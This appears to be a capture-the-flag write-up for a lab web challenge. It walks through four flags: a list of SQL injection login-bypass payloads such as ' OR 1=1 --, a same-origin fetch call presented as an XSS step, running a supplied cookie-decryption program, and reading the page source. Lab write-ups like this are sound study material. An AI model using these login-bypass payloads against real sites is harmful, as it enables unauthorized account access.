## SQL Injection

The first login page is vulnerable to SQL injection. The following payloads can be used to bypass the login:


 ```sql
 admin' --
 admin' #
 admin'/*
 ' OR 1=1 --
 ' OR 1=1 #
 ' OR 1=1/*
 ') OR '1'='1--
 ') OR ('1'='1--
 ```

Use this payload in either the username or password field to bypass the login, obtaining the first flag.

## Cross-Site Scripting

Using the downloaded script from the website, we can inject a script into the console of the browser, leading to a successful XSS attack. The following payload can be used to inject the script:

```javascript
fetch("/execute_xss", {
  headers: {
    "X-Execute-XSS": "true",
  },
}).then((response) => {
  if (response.ok) {
    window.location.href = "/execute_xss_redirect";
  }
});
```

This would cause a redirect to the `/execute_xss_redirect` page, where the second flag would be displayed.

## Cookie decryption

After the XSS attack, an encrypted cookie is stored in the browser, which can be decrypted using the provided custom program.

To execute the program, it need to be executable. To do this, run the following command:

```bash
chmod +x dcrpt_xxx_yyy
```

Then, run the program:

```bash
./dcrpt_xxx_yyy
```

The decrypted cookie will be displayed, containing the third flag.

## Web

The website contains the final flag in the source code of the page. By inspecting the source HTML code, the fourth flag can be found.
